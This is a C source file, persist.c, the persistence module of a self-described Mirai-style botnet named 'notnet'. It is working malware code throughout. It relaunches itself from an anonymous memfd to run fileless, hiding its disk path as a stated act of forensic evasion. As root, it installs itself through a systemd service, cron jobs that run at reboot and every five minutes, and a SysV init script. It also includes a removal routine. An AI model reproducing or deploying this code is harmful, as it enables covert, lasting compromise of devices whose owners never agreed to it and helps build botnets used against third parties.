/*
 * notnet - Modern Mirai-Style Botnet
 * persist.c - Persistence module (systemd, cron, SysV init)
 */
#include "persist.h"
#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#ifdef __linux__
#include <sys/syscall.h>
#endif

/* ── Fileless / RAM-only Mode (SECURITY FIX #84) ──────────────── */
/* MFD_CLOEXEC is a GNU extension; use the stable kernel ABI value (0x0001)
 * so the build stays portable without _GNU_SOURCE. */
#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

extern char **environ;  /* passed through the fexecve self-relaunch */

/* Returns 1 if this process is already running from an anonymous memfd
 * (i.e. /proc/self/exe resolves to /memfd:...). On platforms without a
 * readable /proc/self/exe we fail safe and report "already fileless" so
 * the memfd relaunch can never loop. */
static int already_fileless(void) {
    char exe_path[64];
    ssize_t n = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (n < 0) {
        log_warn("Fileless: cannot read /proc/self/exe (%s) - skipping relaunch",
                 strerror(errno));
        return 1;
    }
    exe_path[n] = '\0';
    return (strncmp(exe_path, "/memfd:", 7) == 0 ||
            strstr(exe_path, " (deleted)") != NULL);
}

/* Linux-only: memfd_create() wrapper via raw syscall so no _GNU_SOURCE or
 * glibc >= 2.27 is required. Returns the memfd, or -1 on failure. */
static int memfd_create_wrap(const char *name, unsigned int flags) {
#if defined(__linux__) && defined(SYS_memfd_create)
    return (int)syscall(SYS_memfd_create, name, flags);
#else
    (void)name;
    (void)flags;
    errno = ENOSYS;
    return -1;
#endif
}

/* SECURITY FIX (#84): Fileless / RAM-resident operation mode.
 * When persist_enabled=0 the bot must leave no disk-backed executable:
 * copy the current image into an anonymous memfd and fexecve() it,
 * replacing this process in place. On success this never returns. On any
 * failure (no memfd_create, no /proc, fexecve error) we log and continue
 * disk-backed — the bot must still function, it just skips persistence.
 * Reboot-loss is deliberate forensic evasion, not a bug. */
int persist_become_fileless(notnet_bot_t *bot) {
    if (bot->persist_enabled) {
        /* Normal mode: nothing to do here. */
        return 0;
    }

    log_info("Persistence disabled (persist_enabled=0) - RAM-only fileless mode");

    if (already_fileless()) {
        log_info("Fileless: already running from anonymous memfd");
        return 0;
    }

#ifdef __linux__
    int fd = memfd_create_wrap("notnet", MFD_CLOEXEC);
    if (fd < 0) {
        log_warn("Fileless: memfd_create failed (%s) - continuing disk-backed",
                 strerror(errno));
        return -1;
    }

    /* Copy our own binary into the anonymous memory file. */
    int src = open("/proc/self/exe", O_RDONLY);
    if (src < 0) {
        log_warn("Fileless: cannot open /proc/self/exe (%s) - continuing disk-backed",
                 strerror(errno));
        close(fd);
        return -1;
    }
    char buf[8192];
    ssize_t n;
    while ((n = read(src, buf, sizeof(buf))) > 0) {
        char *p = buf;
        ssize_t rem = n;
        while (rem > 0) {
            ssize_t w = write(fd, p, (size_t)rem);
            if (w <= 0) {
                log_warn("Fileless: memfd write failed (%s) - continuing disk-backed",
                         strerror(errno));
                close(src);
                close(fd);
                return -1;
            }
            p += w;
            rem -= w;
        }
    }
    close(src);

    /* init_bot() re-creates /tmp/notnet.lock with O_EXCL in the new image;
     * drop the stale lock file now (we still hold it until the exec). */
    unlink("/tmp/notnet.lock");

    /* Replace the current image with the memfd copy. argv[0] is masked so
     * /proc/<pid>/cmdline does not reveal the original disk path. */
    char *argv[] = { "notnet", NULL };
    fexecve(fd, argv, environ);
    log_warn("Fileless: fexecve failed (%s) - continuing disk-backed",
             strerror(errno));
    close(fd);
    return -1;
#else
    log_info("Fileless: platform lacks memfd_create, continuing disk-backed");
    return 0;
#endif
}

/* ── Init System Detection ────────────────────────────────── */
int detect_init_system(void) {
    int detected = 0;
    
    /* Check for systemd */
    struct stat st;
    if (stat("/run/systemd/system", &st) == 0) {
        log_info("Detected systemd");
        detected |= PERSIST_SYSTEMD;
    }
    
    /* Check for cron */
    if (access("/usr/bin/crontab", F_OK) == 0 ||
        access("/bin/crontab", F_OK) == 0) {
        log_info("Detected cron");
        detected |= PERSIST_CRON;
    }
    
    /* Check for SysV init */
    if (stat("/etc/init.d", &st) == 0) {
        log_info("Detected SysV init");
        detected |= PERSIST_SYSV;
    }
    
    return detected;
}

/* ── Get Binary Path ──────────────────────────────────────── */
int get_persist_path(char *buf, int len) {
    /* Use /tmp/.notnet as default, fallback to /var/tmp/.notnet */
    if (access("/tmp", W_OK) == 0) {
        snprintf(buf, len, "/tmp/.notnet");
    } else {
        snprintf(buf, len, "/var/tmp/.notnet");
    }
    return 0;
}

/* SECURITY FIX (#41/#42/#43): Validate a binary path before it is
 * interpolated into system() shell commands or init scripts.
 * Reject anything outside [a-zA-Z0-9_./-] — spaces, quotes, backticks,
 * $, ;, |, &, >, <, newlines all break out of the quoting/shell context
 * (CWE-78). Returns 0 if safe, -1 if rejected. */
static int validate_bin_path(const char *bin_path) {
    if (!bin_path || bin_path[0] == '\0') return -1;
    for (const char *p = bin_path; *p; p++) {
        char c = *p;
        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
              (c >= '0' && c <= '9') || c == '_' || c == '.' ||
              c == '/' || c == '-')) {
            log_error("Persistence: bin_path rejected (unsafe char '%c')", c);
            return -1;
        }
    }
    return 0;
}

/* ── systemd Service ─────────────────────────────────────── */
int install_systemd(const char *bin_path) {
    if (validate_bin_path(bin_path) != 0) return -1;

    char unit_path[256];
    snprintf(unit_path, sizeof(unit_path), "/etc/systemd/system/notnet.service");
    
    char content[512];
    /* SECURITY FIX (#43): Quote ExecStart so even a path containing
     * spaces cannot be mis-parsed as multiple arguments. */
    snprintf(content, sizeof(content),
        "[Unit]\n"
        "Description=Notnet Bot\n"
        "After=network.target\n"
        "\n"
        "[Service]\n"
        "Type=simple\n"
        "ExecStart=\"%s\"\n"
        "Restart=always\n"
        "RestartSec=30\n"
        "User=root\n"
        "\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n",
        bin_path);
    
    FILE *f = fopen(unit_path, "w");
    if (!f) {
        log_error("systemd: cannot write %s", unit_path);
        return -1;
    }
    
    fprintf(f, "%s", content);
    fclose(f);
    
    /* Reload systemd and enable service */
    system("systemctl daemon-reload 2>/dev/null");
    system("systemctl enable notnet.service 2>/dev/null");
    system("systemctl start notnet.service 2>/dev/null");
    
    log_info("systemd: service installed at %s", unit_path);
    return 0;
}

/* ── cron Job ──────────────────────────────────────────────── */
int install_cron(const char *bin_path) {
    if (validate_bin_path(bin_path) != 0) return -1;

    char cron_line[256];
    snprintf(cron_line, sizeof(cron_line),
        "@reboot %s\n"
        "*/5 * * * * %s\n",
        bin_path, bin_path);

    /* SECURITY FIX (#42): Do NOT pipe the cron line through a shell
     * echo. The old code ran `(crontab -l; echo '%s') | crontab -` —
     * a single quote in bin_path (or in the existing crontab) broke
     * out of the quoting and executed arbitrary commands (CWE-78).
     * Build the new crontab in a temp file and feed it to crontab
     * directly; no shell interpolation of the cron line at all. */

    /* Read existing crontab */
    char existing[4096];
    existing[0] = '\0';
    FILE *f = popen("crontab -l 2>/dev/null", "r");
    if (f) {
        fread(existing, 1, sizeof(existing) - 1, f);
        existing[sizeof(existing) - 1] = '\0';
        pclose(f);
    }

    /* Check if already installed */
    if (strstr(existing, bin_path)) {
        log_info("cron: already installed");
        return 0;
    }

    /* Write combined crontab to a temp file */
    char tmp_path[] = "/tmp/notnet.cron.XXXXXX";
    int fd = mkstemp(tmp_path);
    if (fd < 0) {
        log_error("cron: mkstemp failed: %s", strerror(errno));
        return -1;
    }
    FILE *tf = fdopen(fd, "w");
    if (!tf) {
        close(fd);
        unlink(tmp_path);
        log_error("cron: fdopen failed: %s", strerror(errno));
        return -1;
    }
    if (existing[0]) fprintf(tf, "%s\n", existing);
    fprintf(tf, "%s", cron_line);
    fclose(tf);

    /* Install via crontab <file> — no shell, no interpolation */
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "crontab %s", tmp_path);
    int ret = system(cmd);
    unlink(tmp_path);

    if (ret == 0) {
        log_info("cron: job installed");
    } else {
        log_warn("cron: install failed (ret %d)", ret);
    }

    return ret;
}

/* ── SysV Init Script ────────────────────────────────────── */
int install_sysv(const char *bin_path) {
    if (validate_bin_path(bin_path) != 0) return -1;

    char script_path[256];
    snprintf(script_path, sizeof(script_path), "/etc/init.d/notnet");
    
    char content[512];
    /* SECURITY FIX (#43): Quote BIN="..." so a path with spaces cannot
     * be split into multiple words by the init script's shell. */
    snprintf(content, sizeof(content),
        "#!/bin/sh\n"
        "# Notnet Bot\n"
        "# Description: Notnet botnet agent\n"
        "# chkconfig: 2345 99 01\n"
        "\n"
        "BIN=\"%s\"\n"
        "\n"
        "case \"$1\" in\n"
        "  start)\n"
        "    \"$BIN\" &\n"
        "    ;;\n"
        "  stop)\n"
        "    killall notnet 2>/dev/null\n"
        "    ;;\n"
        "  restart)\n"
        "    $0 stop\n"
        "    $0 start\n"
        "    ;;\n"
        "  *)\n"
        "    echo \"Usage: $0 {start|stop|restart}\"\n"
        "    exit 1\n"
        "    ;;\n"
        "esac\n"
        "exit 0\n",
        bin_path);
    
    FILE *f = fopen(script_path, "w");
    if (!f) {
        log_error("sysv: cannot write %s", script_path);
        return -1;
    }
    
    fprintf(f, "%s", content);
    fclose(f);
    
    chmod(script_path, 0755);
    
    /* Enable service */
    if (access("/usr/sbin/update-rc.d", F_OK) == 0) {
        system("update-rc.d notnet defaults 2>/dev/null");
    }
    if (access("/sbin/chkconfig", F_OK) == 0) {
        system("chkconfig --add notnet 2>/dev/null");
    }
    
    log_info("sysv: init script installed at %s", script_path);
    return 0;
}

/* ── Install Persistence ─────────────────────────────────── */
int persist_install(notnet_bot_t *bot) {
    /* SECURITY FIX (#84): persist_enabled=0 selects RAM-only fileless
     * operation — persist_become_fileless() handles the memfd relaunch,
     * here we simply refuse to install any launch point. */
    if (!bot->persist_enabled) {
        log_info("Persistence: skipped (persist_enabled=0, RAM-only mode)");
        return 0;
    }

    (void)bot;  /* reserved for future use (e.g. per-bot persistence config) */
    /* SECURITY FIX (#7): Only attempt persistence as root — otherwise
     * the writes to /etc/systemd/system, /etc/init.d, and crontab will
     * fail or require dangerous sudo escalation. */
    if (geteuid() != 0) {
        log_warn("Persistence: not running as root, skipping (requires privileges)");
        return -1;
    }

    int detected = detect_init_system();
    
    char bin_path[256];
    get_persist_path(bin_path, sizeof(bin_path));

    /* SECURITY FIX (#41/#42/#43): Validate the final bin_path before any
     * installer interpolates it into a shell command or init script. */
    if (validate_bin_path(bin_path) != 0) {
        log_error("Persistence: refusing to install with unsafe bin_path %s", bin_path);
        return -1;
    }
    
    /* Install to the detected init system(s) */
    if (detected & PERSIST_SYSTEMD) {
        install_systemd(bin_path);
    }
    
    if (detected & PERSIST_CRON) {
        install_cron(bin_path);
    }
    
    if (detected & PERSIST_SYSV) {
        install_sysv(bin_path);
    }
    
    log_info("Persistence: installed (systemd=%d cron=%d sysv=%d)",
             !!(detected & PERSIST_SYSTEMD),
             !!(detected & PERSIST_CRON),
             !!(detected & PERSIST_SYSV));
    
    return 0;
}

/* ── Remove Persistence ──────────────────────────────────── */
int remove_persistence(void) {
    /* systemd */
    if (access("/etc/systemd/system/notnet.service", F_OK) == 0) {
        system("systemctl disable notnet.service 2>/dev/null");
        system("systemctl stop notnet.service 2>/dev/null");
        unlink("/etc/systemd/system/notnet.service");
        system("systemctl daemon-reload 2>/dev/null");
    }
    
    /* cron */
    system("crontab -l 2>/dev/null | grep -v notnet | crontab - 2>/dev/null");
    
    /* sysv */
    if (access("/etc/init.d/notnet", F_OK) == 0) {
        system("update-rc.d -f notnet remove 2>/dev/null");
        unlink("/etc/init.d/notnet");
    }
    
    log_info("Persistence: removed");
    return 0;
}
